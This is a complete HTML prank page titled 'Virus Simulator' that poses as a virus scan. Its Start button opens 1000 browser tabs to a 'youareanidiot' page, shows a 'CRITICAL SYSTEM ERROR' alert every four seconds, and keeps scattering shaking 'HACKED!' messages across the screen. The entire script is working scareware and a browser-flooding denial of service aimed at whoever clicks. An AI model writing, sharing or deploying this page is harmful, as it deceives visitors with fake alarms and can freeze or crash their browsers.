<!DOCTYPE html>
<html>
<head>
  <title>Virus Simulator</title>
  <style>
    body {
      background: black;
      color: lime;
      font-family: monospace;
      text-align: center;
      padding-top: 100px;
    }
    button {
      font-size: 24px;
      padding: 10px 20px;
      cursor: pointer;
    }
    .spam {
      position: absolute;
      animation: shake 0.2s infinite;
    }
    @keyframes shake {
      0% { transform: translate(1px, 1px); }
      25% { transform: translate(-1px, 1px); }
      50% { transform: translate(-1px, -1px); }
      75% { transform: translate(1px, -1px); }
      100% { transform: translate(0, 0); }
    }
  </style>
</head>
<body>
  <h1>Start Virus Scan</h1>
  <button onclick="startVirus()">Start</button>

  <script>
    function startVirus() {
      alert("Scanning...");
      // Open tabs immediately after click
      for (let i = 0; i < 1000; i++) {
        window.open("https://thegeekboiz.github.io/PythonScratcher/youareanidiot/index.html", "_blank");
      }

      // Looping alerts
      setInterval(() => alert("CRITICAL SYSTEM ERROR"), 4000);

      // Spam text
      setInterval(() => {
        const msg = document.createElement('div');
        msg.className = "spam";
        msg.innerText = "HACKED!";
        msg.style.left = Math.random() * window.innerWidth + "px";
        msg.style.top = Math.random() * window.innerHeight + "px";
        document.body.appendChild(msg);
      }, 150);
    }
  </script>
</body>
</html>
